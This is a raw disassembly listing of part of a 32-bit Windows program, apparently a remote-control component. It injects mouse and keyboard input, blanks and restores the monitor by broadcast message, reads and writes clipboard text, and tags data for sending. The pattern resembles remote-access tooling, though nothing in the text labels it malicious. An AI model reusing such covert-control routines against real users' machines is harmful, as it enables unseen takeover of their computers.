  406cf1:	68 00 80 00 00       	push   $0x8000
  406cf6:	6a 00                	push   $0x0
  406cf8:	55                   	push   %ebp
  406cf9:	ff 15 ec b1 40 00    	call   *0x40b1ec
  406cff:	5f                   	pop    %edi
  406d00:	5e                   	pop    %esi
  406d01:	5d                   	pop    %ebp
  406d02:	5b                   	pop    %ebx
  406d03:	83 c4 08             	add    $0x8,%esp
  406d06:	c3                   	ret
  406d07:	90                   	nop
  406d08:	90                   	nop
  406d09:	90                   	nop
  406d0a:	90                   	nop
  406d0b:	90                   	nop
  406d0c:	90                   	nop
  406d0d:	90                   	nop
  406d0e:	90                   	nop
  406d0f:	90                   	nop
  406d10:	51                   	push   %ecx
  406d11:	53                   	push   %ebx
  406d12:	55                   	push   %ebp
  406d13:	56                   	push   %esi
  406d14:	57                   	push   %edi
  406d15:	8b f9                	mov    %ecx,%edi
  406d17:	89 7c 24 10          	mov    %edi,0x10(%esp)
  406d1b:	8b 8f a8 00 00 00    	mov    0xa8(%edi),%ecx
  406d21:	e8 9a 0d 00 00       	call   0x407ac0
  406d26:	8b f0                	mov    %eax,%esi
  406d28:	85 f6                	test   %esi,%esi
  406d2a:	74 49                	je     0x406d75
  406d2c:	8b 8f a8 00 00 00    	mov    0xa8(%edi),%ecx
  406d32:	e8 99 0e 00 00       	call   0x407bd0
  406d37:	8b d8                	mov    %eax,%ebx
  406d39:	43                   	inc    %ebx
  406d3a:	53                   	push   %ebx
  406d3b:	e8 a0 39 00 00       	call   0x40a6e0
  406d40:	8b e8                	mov    %eax,%ebp
  406d42:	83 c4 04             	add    $0x4,%esp
  406d45:	85 ed                	test   %ebp,%ebp
  406d47:	74 2c                	je     0x406d75
  406d49:	8d 4b ff             	lea    -0x1(%ebx),%ecx
  406d4c:	8d 7d 01             	lea    0x1(%ebp),%edi
  406d4f:	8b c1                	mov    %ecx,%eax
  406d51:	c6 45 00 74          	movb   $0x74,0x0(%ebp)
  406d55:	c1 e9 02             	shr    $0x2,%ecx
  406d58:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406d5a:	8b c8                	mov    %eax,%ecx
  406d5c:	53                   	push   %ebx
  406d5d:	83 e1 03             	and    $0x3,%ecx
  406d60:	55                   	push   %ebp
  406d61:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  406d63:	8b 4c 24 18          	mov    0x18(%esp),%ecx
  406d67:	e8 34 f2 ff ff       	call   0x405fa0
  406d6c:	55                   	push   %ebp
  406d6d:	e8 74 39 00 00       	call   0x40a6e6
  406d72:	83 c4 04             	add    $0x4,%esp
  406d75:	5f                   	pop    %edi
  406d76:	5e                   	pop    %esi
  406d77:	5d                   	pop    %ebp
  406d78:	5b                   	pop    %ebx
  406d79:	59                   	pop    %ecx
  406d7a:	c3                   	ret
  406d7b:	90                   	nop
  406d7c:	90                   	nop
  406d7d:	90                   	nop
  406d7e:	90                   	nop
  406d7f:	90                   	nop
  406d80:	83 ec 08             	sub    $0x8,%esp
  406d83:	53                   	push   %ebx
  406d84:	55                   	push   %ebp
  406d85:	8d 44 24 08          	lea    0x8(%esp),%eax
  406d89:	56                   	push   %esi
  406d8a:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  406d8e:	8b 89 a8 00 00 00    	mov    0xa8(%ecx),%ecx
  406d94:	50                   	push   %eax
  406d95:	e8 e6 08 00 00       	call   0x407680
  406d9a:	8b f0                	mov    %eax,%esi
  406d9c:	8b 44 24 0c          	mov    0xc(%esp),%eax
  406da0:	85 c0                	test   %eax,%eax
  406da2:	74 44                	je     0x406de8
  406da4:	85 f6                	test   %esi,%esi
  406da6:	74 40                	je     0x406de8
  406da8:	8d 68 01             	lea    0x1(%eax),%ebp
  406dab:	55                   	push   %ebp
  406dac:	e8 2f 39 00 00       	call   0x40a6e0
  406db1:	8b d8                	mov    %eax,%ebx
  406db3:	83 c4 04             	add    $0x4,%esp
  406db6:	85 db                	test   %ebx,%ebx
  406db8:	74 2e                	je     0x406de8
  406dba:	c6 03 75             	movb   $0x75,(%ebx)
  406dbd:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  406dc1:	8b d1                	mov    %ecx,%edx
  406dc3:	57                   	push   %edi
  406dc4:	8d 7b 01             	lea    0x1(%ebx),%edi
  406dc7:	55                   	push   %ebp
  406dc8:	c1 e9 02             	shr    $0x2,%ecx
  406dcb:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406dcd:	8b ca                	mov    %edx,%ecx
  406dcf:	53                   	push   %ebx
  406dd0:	83 e1 03             	and    $0x3,%ecx
  406dd3:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  406dd5:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  406dd9:	e8 c2 f1 ff ff       	call   0x405fa0
  406dde:	53                   	push   %ebx
  406ddf:	e8 02 39 00 00       	call   0x40a6e6
  406de4:	83 c4 04             	add    $0x4,%esp
  406de7:	5f                   	pop    %edi
  406de8:	5e                   	pop    %esi
  406de9:	5d                   	pop    %ebp
  406dea:	5b                   	pop    %ebx
  406deb:	83 c4 08             	add    $0x8,%esp
  406dee:	c3                   	ret
  406def:	90                   	nop
  406df0:	55                   	push   %ebp
  406df1:	8b ec                	mov    %esp,%ebp
  406df3:	6a ff                	push   $0xffffffff
  406df5:	68 d0 ac 40 00       	push   $0x40acd0
  406dfa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  406e00:	50                   	push   %eax
  406e01:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  406e08:	51                   	push   %ecx
  406e09:	53                   	push   %ebx
  406e0a:	56                   	push   %esi
  406e0b:	8b 75 08             	mov    0x8(%ebp),%esi
  406e0e:	57                   	push   %edi
  406e0f:	8b ce                	mov    %esi,%ecx
  406e11:	89 65 f0             	mov    %esp,-0x10(%ebp)
  406e14:	e8 77 fe ff ff       	call   0x406c90
  406e19:	8b ce                	mov    %esi,%ecx
  406e1b:	e8 f0 f1 ff ff       	call   0x406010
  406e20:	8b ce                	mov    %esi,%ecx
  406e22:	e8 e9 fe ff ff       	call   0x406d10
  406e27:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  406e2e:	8a 46 10             	mov    0x10(%esi),%al
  406e31:	84 c0                	test   %al,%al
  406e33:	74 0f                	je     0x406e44
  406e35:	8b ce                	mov    %esi,%ecx
  406e37:	e8 44 ff ff ff       	call   0x406d80
  406e3c:	eb f0                	jmp    0x406e2e
  406e3e:	b8 44 6e 40 00       	mov    $0x406e44,%eax
  406e43:	c3                   	ret
  406e44:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  406e47:	5f                   	pop    %edi
  406e48:	5e                   	pop    %esi
  406e49:	33 c0                	xor    %eax,%eax
  406e4b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406e52:	5b                   	pop    %ebx
  406e53:	8b e5                	mov    %ebp,%esp
  406e55:	5d                   	pop    %ebp
  406e56:	c2 04 00             	ret    $0x4
  406e59:	90                   	nop
  406e5a:	90                   	nop
  406e5b:	90                   	nop
  406e5c:	90                   	nop
  406e5d:	90                   	nop
  406e5e:	90                   	nop
  406e5f:	90                   	nop
  406e60:	53                   	push   %ebx
  406e61:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  406e65:	8b cb                	mov    %ebx,%ecx
  406e67:	e8 24 04 00 00       	call   0x407290
  406e6c:	84 c0                	test   %al,%al
  406e6e:	0f 84 d5 00 00 00    	je     0x406f49
  406e74:	55                   	push   %ebp
  406e75:	8b 2d 2c b3 40 00    	mov    0x40b32c,%ebp
  406e7b:	56                   	push   %esi
  406e7c:	57                   	push   %edi
  406e7d:	8b 3d 68 b3 40 00    	mov    0x40b368,%edi
  406e83:	33 f6                	xor    %esi,%esi
  406e85:	8b cb                	mov    %ebx,%ecx
  406e87:	e8 04 04 00 00       	call   0x407290
  406e8c:	84 c0                	test   %al,%al
  406e8e:	74 28                	je     0x406eb8
  406e90:	8b cb                	mov    %ebx,%ecx
  406e92:	e8 b9 03 00 00       	call   0x407250
  406e97:	84 c0                	test   %al,%al
  406e99:	74 0f                	je     0x406eaa
  406e9b:	8b cb                	mov    %ebx,%ecx
  406e9d:	e8 fe 03 00 00       	call   0x4072a0
  406ea2:	50                   	push   %eax
  406ea3:	8b cb                	mov    %ebx,%ecx
  406ea5:	e8 d6 fa ff ff       	call   0x406980
  406eaa:	6a 0a                	push   $0xa
  406eac:	ff 15 c4 b0 40 00    	call   *0x40b0c4
  406eb2:	46                   	inc    %esi
  406eb3:	83 fe 64             	cmp    $0x64,%esi
  406eb6:	7c cd                	jl     0x406e85
  406eb8:	8a 43 12             	mov    0x12(%ebx),%al
  406ebb:	84 c0                	test   %al,%al
  406ebd:	74 26                	je     0x406ee5
  406ebf:	6a 00                	push   $0x0
  406ec1:	6a 00                	push   $0x0
  406ec3:	6a 01                	push   $0x1
  406ec5:	6a 56                	push   $0x56
  406ec7:	ff d7                	call   *%edi
  406ec9:	6a 02                	push   $0x2
  406ecb:	68 70 f1 00 00       	push   $0xf170
  406ed0:	68 12 01 00 00       	push   $0x112
  406ed5:	68 ff ff 00 00       	push   $0xffff
  406eda:	ff d5                	call   *%ebp
  406edc:	c6 05 44 e8 40 00 01 	movb   $0x1,0x40e844
  406ee3:	eb 2d                	jmp    0x406f12
  406ee5:	a0 44 e8 40 00       	mov    0x40e844,%al
  406eea:	84 c0                	test   %al,%al
  406eec:	74 24                	je     0x406f12
  406eee:	6a 00                	push   $0x0
  406ef0:	6a 00                	push   $0x0
  406ef2:	6a 00                	push   $0x0
  406ef4:	6a 56                	push   $0x56
  406ef6:	ff d7                	call   *%edi
  406ef8:	6a ff                	push   $0xffffffff
  406efa:	68 70 f1 00 00       	push   $0xf170
  406eff:	68 12 01 00 00       	push   $0x112
  406f04:	68 ff ff 00 00       	push   $0xffff
  406f09:	ff d5                	call   *%ebp
  406f0b:	c6 05 44 e8 40 00 00 	movb   $0x0,0x40e844
  406f12:	33 c0                	xor    %eax,%eax
  406f14:	8a 43 11             	mov    0x11(%ebx),%al
  406f17:	50                   	push   %eax
  406f18:	e8 11 3a 00 00       	call   0x40a92e
  406f1d:	8b cb                	mov    %ebx,%ecx
  406f1f:	e8 2c 03 00 00       	call   0x407250
  406f24:	84 c0                	test   %al,%al
  406f26:	74 0f                	je     0x406f37
  406f28:	8b cb                	mov    %ebx,%ecx
  406f2a:	e8 71 03 00 00       	call   0x4072a0
  406f2f:	50                   	push   %eax
  406f30:	8b cb                	mov    %ebx,%ecx
  406f32:	e8 49 fa ff ff       	call   0x406980
  406f37:	8b cb                	mov    %ebx,%ecx
  406f39:	e8 52 03 00 00       	call   0x407290
  406f3e:	84 c0                	test   %al,%al
  406f40:	0f 85 3d ff ff ff    	jne    0x406e83
  406f46:	5f                   	pop    %edi
  406f47:	5e                   	pop    %esi
  406f48:	5d                   	pop    %ebp
  406f49:	6a 00                	push   $0x0
  406f4b:	e8 de 39 00 00       	call   0x40a92e
  406f50:	83 c8 ff             	or     $0xffffffff,%eax
  406f53:	5b                   	pop    %ebx
  406f54:	c2 04 00             	ret    $0x4
  406f57:	90                   	nop
  406f58:	90                   	nop
  406f59:	90                   	nop
  406f5a:	90                   	nop
  406f5b:	90                   	nop
  406f5c:	90                   	nop
  406f5d:	90                   	nop
  406f5e:	90                   	nop
  406f5f:	90                   	nop
  406f60:	56                   	push   %esi
  406f61:	8b 74 24 0c          	mov    0xc(%esp),%esi
  406f65:	8b c6                	mov    %esi,%eax
  406f67:	33 d2                	xor    %edx,%edx
  406f69:	b9 1c 00 00 00       	mov    $0x1c,%ecx
  406f6e:	f7 f1                	div    %ecx
  406f70:	85 d2                	test   %edx,%edx
  406f72:	0f 85 99 01 00 00    	jne    0x407111
  406f78:	e8 53 29 00 00       	call   0x4098d0
  406f7d:	b8 25 49 92 24       	mov    $0x24924925,%eax
  406f82:	f7 e6                	mul    %esi
  406f84:	2b f2                	sub    %edx,%esi
  406f86:	d1 ee                	shr    $1,%esi
  406f88:	03 f2                	add    %edx,%esi
  406f8a:	c1 ee 04             	shr    $0x4,%esi
  406f8d:	85 f6                	test   %esi,%esi
  406f8f:	0f 8e 7c 01 00 00    	jle    0x407111
  406f95:	8b 54 24 08          	mov    0x8(%esp),%edx
  406f99:	53                   	push   %ebx
  406f9a:	55                   	push   %ebp
  406f9b:	8b 2d 08 b3 40 00    	mov    0x40b308,%ebp
  406fa1:	57                   	push   %edi
  406fa2:	8d 5a 08             	lea    0x8(%edx),%ebx
  406fa5:	89 74 24 18          	mov    %esi,0x18(%esp)
  406fa9:	8b 43 fc             	mov    -0x4(%ebx),%eax
  406fac:	3d 00 02 00 00       	cmp    $0x200,%eax
  406fb1:	72 2a                	jb     0x406fdd
  406fb3:	3d 08 02 00 00       	cmp    $0x208,%eax
  406fb8:	77 23                	ja     0x406fdd
  406fba:	8b 7b 04             	mov    0x4(%ebx),%edi
  406fbd:	33 f6                	xor    %esi,%esi
  406fbf:	66 8b 73 04          	mov    0x4(%ebx),%si
  406fc3:	c1 ef 10             	shr    $0x10,%edi
  406fc6:	57                   	push   %edi
  406fc7:	56                   	push   %esi
  406fc8:	ff 15 04 b3 40 00    	call   *0x40b304
  406fce:	57                   	push   %edi
  406fcf:	56                   	push   %esi
  406fd0:	ff 15 00 b3 40 00    	call   *0x40b300
  406fd6:	50                   	push   %eax
  406fd7:	ff 15 fc b2 40 00    	call   *0x40b2fc
  406fdd:	8b 43 fc             	mov    -0x4(%ebx),%eax
  406fe0:	3d 03 02 00 00       	cmp    $0x203,%eax
  406fe5:	0f 87 a2 00 00 00    	ja     0x40708d
  406feb:	0f 84 84 00 00 00    	je     0x407075
  406ff1:	3d 05 01 00 00       	cmp    $0x105,%eax
  406ff6:	77 51                	ja     0x407049
  406ff8:	74 31                	je     0x40702b
  406ffa:	2d 00 01 00 00       	sub    $0x100,%eax
  406fff:	74 0c                	je     0x40700d
  407001:	48                   	dec    %eax
  407002:	74 27                	je     0x40702b
  407004:	83 e8 03             	sub    $0x3,%eax
  407007:	0f 85 ef 00 00 00    	jne    0x4070fc
  40700d:	8b 03                	mov    (%ebx),%eax
  40700f:	6a 00                	push   $0x0
  407011:	6a 00                	push   $0x0
  407013:	6a 00                	push   $0x0
  407015:	50                   	push   %eax
  407016:	ff 15 f8 b2 40 00    	call   *0x40b2f8
  40701c:	8a 0b                	mov    (%ebx),%cl
  40701e:	50                   	push   %eax
  40701f:	51                   	push   %ecx
  407020:	ff 15 f4 b2 40 00    	call   *0x40b2f4
  407026:	e9 d1 00 00 00       	jmp    0x4070fc
  40702b:	8b 13                	mov    (%ebx),%edx
  40702d:	6a 00                	push   $0x0
  40702f:	6a 02                	push   $0x2
  407031:	6a 00                	push   $0x0
  407033:	52                   	push   %edx
  407034:	ff 15 f8 b2 40 00    	call   *0x40b2f8
  40703a:	50                   	push   %eax
  40703b:	8a 03                	mov    (%ebx),%al
  40703d:	50                   	push   %eax
  40703e:	ff 15 f4 b2 40 00    	call   *0x40b2f4
  407044:	e9 b3 00 00 00       	jmp    0x4070fc
  407049:	2d 01 02 00 00       	sub    $0x201,%eax
  40704e:	74 16                	je     0x407066
  407050:	48                   	dec    %eax
  407051:	0f 85 a5 00 00 00    	jne    0x4070fc
  407057:	6a 00                	push   $0x0
  407059:	6a 00                	push   $0x0
  40705b:	6a 00                	push   $0x0
  40705d:	6a 00                	push   $0x0
  40705f:	6a 04                	push   $0x4
  407061:	e9 94 00 00 00       	jmp    0x4070fa
  407066:	6a 00                	push   $0x0
  407068:	6a 00                	push   $0x0
  40706a:	6a 00                	push   $0x0
  40706c:	6a 00                	push   $0x0
  40706e:	6a 02                	push   $0x2
  407070:	e9 85 00 00 00       	jmp    0x4070fa
  407075:	6a 00                	push   $0x0
  407077:	6a 00                	push   $0x0
  407079:	6a 00                	push   $0x0
  40707b:	6a 00                	push   $0x0
  40707d:	6a 06                	push   $0x6
  40707f:	ff d5                	call   *%ebp
  407081:	6a 00                	push   $0x0
  407083:	6a 00                	push   $0x0
  407085:	6a 00                	push   $0x0
  407087:	6a 00                	push   $0x0
  407089:	6a 06                	push   $0x6
  40708b:	eb 6d                	jmp    0x4070fa
  40708d:	05 fc fd ff ff       	add    $0xfffffdfc,%eax
  407092:	83 f8 06             	cmp    $0x6,%eax
  407095:	77 65                	ja     0x4070fc
  407097:	ff 24 85 18 71 40 00 	jmp    *0x407118(,%eax,4)
  40709e:	6a 00                	push   $0x0
  4070a0:	6a 00                	push   $0x0
  4070a2:	6a 00                	push   $0x0
  4070a4:	6a 00                	push   $0x0
  4070a6:	6a 08                	push   $0x8
  4070a8:	eb 50                	jmp    0x4070fa
  4070aa:	6a 00                	push   $0x0
  4070ac:	6a 00                	push   $0x0
  4070ae:	6a 00                	push   $0x0
  4070b0:	6a 00                	push   $0x0
  4070b2:	6a 10                	push   $0x10
  4070b4:	eb 44                	jmp    0x4070fa
  4070b6:	6a 00                	push   $0x0
  4070b8:	6a 00                	push   $0x0
  4070ba:	6a 00                	push   $0x0
  4070bc:	6a 00                	push   $0x0
  4070be:	6a 18                	push   $0x18
  4070c0:	ff d5                	call   *%ebp
  4070c2:	6a 00                	push   $0x0
  4070c4:	6a 00                	push   $0x0
  4070c6:	6a 00                	push   $0x0
  4070c8:	6a 00                	push   $0x0
  4070ca:	6a 18                	push   $0x18
  4070cc:	eb 2c                	jmp    0x4070fa
  4070ce:	6a 00                	push   $0x0
  4070d0:	6a 00                	push   $0x0
  4070d2:	6a 00                	push   $0x0
  4070d4:	6a 00                	push   $0x0
  4070d6:	6a 20                	push   $0x20
  4070d8:	eb 20                	jmp    0x4070fa
  4070da:	6a 00                	push   $0x0
  4070dc:	6a 00                	push   $0x0
  4070de:	6a 00                	push   $0x0
  4070e0:	6a 00                	push   $0x0
  4070e2:	6a 40                	push   $0x40
  4070e4:	eb 14                	jmp    0x4070fa
  4070e6:	8b 0b                	mov    (%ebx),%ecx
  4070e8:	6a 00                	push   $0x0
  4070ea:	c1 e9 10             	shr    $0x10,%ecx
  4070ed:	0f bf d1             	movswl %cx,%edx
  4070f0:	52                   	push   %edx
  4070f1:	6a 00                	push   $0x0
  4070f3:	6a 00                	push   $0x0
  4070f5:	68 00 08 00 00       	push   $0x800
  4070fa:	ff d5                	call   *%ebp
  4070fc:	8b 44 24 18          	mov    0x18(%esp),%eax
  407100:	83 c3 1c             	add    $0x1c,%ebx
  407103:	48                   	dec    %eax
  407104:	89 44 24 18          	mov    %eax,0x18(%esp)
  407108:	0f 85 9b fe ff ff    	jne    0x406fa9
  40710e:	5f                   	pop    %edi
  40710f:	5d                   	pop    %ebp
  407110:	5b                   	pop    %ebx
  407111:	5e                   	pop    %esi
  407112:	c2 08 00             	ret    $0x8
  407115:	8d 49 00             	lea    0x0(%ecx),%ecx
  407118:	9e                   	sahf
  407119:	70 40                	jo     0x40715b
  40711b:	00 aa 70 40 00 b6    	add    %ch,-0x49ffbf90(%edx)
  407121:	70 40                	jo     0x407163
  407123:	00 ce                	add    %cl,%dh
  407125:	70 40                	jo     0x407167
  407127:	00 da                	add    %bl,%dl
  407129:	70 40                	jo     0x40716b
  40712b:	00 fc                	add    %bh,%ah
  40712d:	70 40                	jo     0x40716f
  40712f:	00 e6                	add    %ah,%dh
  407131:	70 40                	jo     0x407173
  407133:	00 90 90 90 90 90    	add    %dl,-0x6f6f6f70(%eax)
  407139:	90                   	nop
  40713a:	90                   	nop
  40713b:	90                   	nop
  40713c:	90                   	nop
  40713d:	90                   	nop
  40713e:	90                   	nop
  40713f:	90                   	nop
  407140:	6a 00                	push   $0x0
  407142:	ff 15 64 b3 40 00    	call   *0x40b364
  407148:	85 c0                	test   %eax,%eax
  40714a:	74 5c                	je     0x4071a8
  40714c:	53                   	push   %ebx
  40714d:	56                   	push   %esi
  40714e:	ff 15 74 b3 40 00    	call   *0x40b374
  407154:	8b 74 24 10          	mov    0x10(%esp),%esi
  407158:	56                   	push   %esi
  407159:	68 00 20 00 00       	push   $0x2000
  40715e:	ff 15 8c b1 40 00    	call   *0x40b18c
  407164:	8b d8                	mov    %eax,%ebx
  407166:	85 db                	test   %ebx,%ebx
  407168:	74 36                	je     0x4071a0
  40716a:	57                   	push   %edi
  40716b:	53                   	push   %ebx
  40716c:	ff 15 88 b1 40 00    	call   *0x40b188
  407172:	8b ce                	mov    %esi,%ecx
  407174:	8b 74 24 10          	mov    0x10(%esp),%esi
  407178:	8b f8                	mov    %eax,%edi
  40717a:	8b c1                	mov    %ecx,%eax
  40717c:	c1 e9 02             	shr    $0x2,%ecx
  40717f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  407181:	8b c8                	mov    %eax,%ecx
  407183:	53                   	push   %ebx
  407184:	83 e1 03             	and    $0x3,%ecx
  407187:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  407189:	ff 15 84 b1 40 00    	call   *0x40b184
  40718f:	53                   	push   %ebx
  407190:	6a 01                	push   $0x1
  407192:	ff 15 98 b3 40 00    	call   *0x40b398
  407198:	53                   	push   %ebx
  407199:	ff 15 80 b1 40 00    	call   *0x40b180
  40719f:	5f                   	pop    %edi
  4071a0:	ff 15 9c b3 40 00    	call   *0x40b39c
  4071a6:	5e                   	pop    %esi
  4071a7:	5b                   	pop    %ebx
  4071a8:	c2 08 00             	ret    $0x8
  4071ab:	90                   	nop
  4071ac:	90                   	nop
  4071ad:	90                   	nop
  4071ae:	90                   	nop
  4071af:	90                   	nop
  4071b0:	83 ec 08             	sub    $0x8,%esp
  4071b3:	56                   	push   %esi
  4071b4:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  4071b8:	6a 00                	push   $0x0
  4071ba:	ff 15 64 b3 40 00    	call   *0x40b364
  4071c0:	85 c0                	test   %eax,%eax
  4071c2:	74 7e                	je     0x407242
  4071c4:	6a 01                	push   $0x1
  4071c6:	ff 15 60 b3 40 00    	call   *0x40b360
  4071cc:	8b f0                	mov    %eax,%esi
  4071ce:	85 f6                	test   %esi,%esi
  4071d0:	89 74 24 04          	mov    %esi,0x4(%esp)
  4071d4:	75 0b                	jne    0x4071e1
  4071d6:	ff 15 9c b3 40 00    	call   *0x40b39c
  4071dc:	5e                   	pop    %esi
  4071dd:	83 c4 08             	add    $0x8,%esp
  4071e0:	c3                   	ret
  4071e1:	53                   	push   %ebx
  4071e2:	55                   	push   %ebp
  4071e3:	57                   	push   %edi
  4071e4:	56                   	push   %esi
  4071e5:	ff 15 90 b1 40 00    	call   *0x40b190
  4071eb:	8b d8                	mov    %eax,%ebx
  4071ed:	56                   	push   %esi
  4071ee:	43                   	inc    %ebx
  4071ef:	ff 15 88 b1 40 00    	call   *0x40b188
  4071f5:	53                   	push   %ebx
  4071f6:	8b f0                	mov    %eax,%esi
  4071f8:	e8 e3 34 00 00       	call   0x40a6e0
  4071fd:	8d 4b ff             	lea    -0x1(%ebx),%ecx
  407200:	8b e8                	mov    %eax,%ebp
  407202:	8b c1                	mov    %ecx,%eax
  407204:	83 c4 04             	add    $0x4,%esp
  407207:	8d 7d 01             	lea    0x1(%ebp),%edi
  40720a:	c6 45 00 76          	movb   $0x76,0x0(%ebp)
  40720e:	c1 e9 02             	shr    $0x2,%ecx
  407211:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  407213:	8b c8                	mov    %eax,%ecx
  407215:	83 e1 03             	and    $0x3,%ecx
  407218:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40721a:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40721e:	51                   	push   %ecx
  40721f:	ff 15 84 b1 40 00    	call   *0x40b184
  407225:	ff 15 9c b3 40 00    	call   *0x40b39c
  40722b:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40722f:	53                   	push   %ebx
  407230:	55                   	push   %ebp
  407231:	e8 6a ed ff ff       	call   0x405fa0
  407236:	55                   	push   %ebp
  407237:	e8 aa 34 00 00       	call   0x40a6e6
  40723c:	83 c4 04             	add    $0x4,%esp
  40723f:	5f                   	pop    %edi
  407240:	5d                   	pop    %ebp
  407241:	5b                   	pop    %ebx
  407242:	5e                   	pop    %esi
  407243:	83 c4 08             	add    $0x8,%esp
  407246:	c3                   	ret
  407247:	90                   	nop
  407248:	90                   	nop
  407249:	90                   	nop
  40724a:	90                   	nop
  40724b:	90                   	nop
  40724c:	90                   	nop
  40724d:	90                   	nop
  40724e:	90                   	nop
  40724f:	90                   	nop
  407250:	8b 89 a8 00 00 00    	mov    0xa8(%ecx),%ecx
  407256:	56                   	push   %esi
  407257:	57                   	push   %edi
  407258:	e8 a3 09 00 00       	call   0x407c00
  40725d:	8b 3d 5c b3 40 00    	mov    0x40b35c,%edi
  407263:	6a 00                	push   $0x0
  407265:	8b f0                	mov    %eax,%esi
  407267:	ff d7                	call   *%edi
  407269:	39 46 04             	cmp    %eax,0x4(%esi)
  40726c:	75 0e                	jne    0x40727c
  40726e:	6a 01                	push   $0x1
  407270:	ff d7                	call   *%edi
  407272:	39 46 08             	cmp    %eax,0x8(%esi)
  407275:	75 05                	jne    0x40727c
  407277:	5f                   	pop    %edi
  407278:	33 c0                	xor    %eax,%eax
  40727a:	5e                   	pop    %esi
  40727b:	c3                   	ret
  40727c:	5f                   	pop    %edi
  40727d:	b8 01 00 00 00       	mov    $0x1,%eax
  407282:	5e                   	pop    %esi
  407283:	c3                   	ret
  407284:	90                   	nop
  407285:	90                   	nop
  407286:	90                   	nop
  407287:	90                   	nop
  407288:	90                   	nop
  407289:	90                   	nop
  40728a:	90                   	nop
  40728b:	90                   	nop
  40728c:	90                   	nop
  40728d:	90                   	nop
  40728e:	90                   	nop
  40728f:	90                   	nop
  407290:	8b 49 04             	mov    0x4(%ecx),%ecx
  407293:	e9 98 ac ff ff       	jmp    0x401f30
  407298:	90                   	nop
  407299:	90                   	nop
  40729a:	90                   	nop
  40729b:	90                   	nop
  40729c:	90                   	nop
  40729d:	90                   	nop
  40729e:	90                   	nop
  40729f:	90                   	nop
  4072a0:	8b 41 18             	mov    0x18(%ecx),%eax
  4072a3:	c3                   	ret
  4072a4:	90                   	nop
  4072a5:	90                   	nop
  4072a6:	90                   	nop
  4072a7:	90                   	nop
  4072a8:	90                   	nop
  4072a9:	90                   	nop
  4072aa:	90                   	nop
  4072ab:	90                   	nop
  4072ac:	90                   	nop
  4072ad:	90                   	nop
  4072ae:	90                   	nop
  4072af:	90                   	nop
  4072b0:	6a ff                	push   $0xffffffff
  4072b2:	68 ee ac 40 00       	push   $0x40acee
  4072b7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4072bd:	50                   	push   %eax
  4072be:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4072c5:	83 ec 44             	sub    $0x44,%esp
  4072c8:	53                   	push   %ebx
  4072c9:	55                   	push   %ebp
  4072ca:	56                   	push   %esi
  4072cb:	8b f1                	mov    %ecx,%esi
  4072cd:	57                   	push   %edi
  4072ce:	89 74 24 10          	mov    %esi,0x10(%esp)
  4072d2:	c7 86 88 00 00 00 d4 	movl   $0x40b4d4,0x88(%esi)
  4072d9:	b4 40 00 
  4072dc:	c7 44 24 14 8a 7f 00 	movl   $0x7f8a,0x14(%esp)
  4072e3:	00 
  4072e4:	c7 44 24 18 00 7f 00 	movl   $0x7f00,0x18(%esp)
  4072eb:	00 
  4072ec:	c7 44 24 1c 03 7f 00 	movl   $0x7f03,0x1c(%esp)
  4072f3:	00 
  4072f4:	c7 44 24 20 89 7f 00 	movl   $0x7f89,0x20(%esp)
  4072fb:	00 
  4072fc:	c7 44 24 24 8b 7f 00 	movl   $0x7f8b,0x24(%esp)
  407303:	00 
  407304:	c7 44 24 28 01 7f 00 	movl   $0x7f01,0x28(%esp)
  40730b:	00 
  40730c:	c7 44 24 2c 81 7f 00 	movl   $0x7f81,0x2c(%esp)
  407313:	00 
  407314:	c7 44 24 30 88 7f 00 	movl   $0x7f88,0x30(%esp)
  40731b:	00 
  40731c:	c7 44 24 34 80 7f 00 	movl   $0x7f80,0x34(%esp)
  407323:	00 
  407324:	c7 44 24 38 86 7f 00 	movl   $0x7f86,0x38(%esp)
  40732b:	00 
  40732c:	c7 44 24 3c 83 7f 00 	movl   $0x7f83,0x3c(%esp)
  407333:	00 
  407334:	c7 44 24 40 85 7f 00 	movl   $0x7f85,0x40(%esp)
  40733b:	00 
  40733c:	c7 44 24 44 82 7f 00 	movl   $0x7f82,0x44(%esp)
  407343:	00 
  407344:	c7 44 24 48 84 7f 00 	movl   $0x7f84,0x48(%esp)
  40734b:	00 
  40734c:	c7 44 24 4c 04 7f 00 	movl   $0x7f04,0x4c(%esp)
  407353:	00 
  407354:	c7 44 24 50 02 7f 00 	movl   $0x7f02,0x50(%esp)
  40735b:	00 
  40735c:	8d 5c 24 14          	lea    0x14(%esp),%ebx
  407360:	8d be cc 00 00 00    	lea    0xcc(%esi),%edi
  407366:	bd 10 00 00 00       	mov    $0x10,%ebp
  40736b:	8b 03                	mov    (%ebx),%eax
  40736d:	50                   	push   %eax
  40736e:	6a 00                	push   $0x0
  407370:	89 47 c0             	mov    %eax,-0x40(%edi)
  407373:	ff 15 88 b3 40 00    	call   *0x40b388
  407379:	89 07                	mov    %eax,(%edi)
  40737b:	83 c3 04             	add    $0x4,%ebx
  40737e:	83 c7 04             	add    $0x4,%edi
  407381:	4d                   	dec    %ebp
  407382:	75 e7                	jne    0x40736b
  407384:	8b 4c 24 64          	mov    0x64(%esp),%ecx
  407388:	33 ed                	xor    %ebp,%ebp
  40738a:	89 6c 24 5c          	mov    %ebp,0x5c(%esp)
  40738e:	c7 06 d8 b4 40 00    	movl   $0x40b4d8,(%esi)
  407394:	8d 41 ff             	lea    -0x1(%ecx),%eax
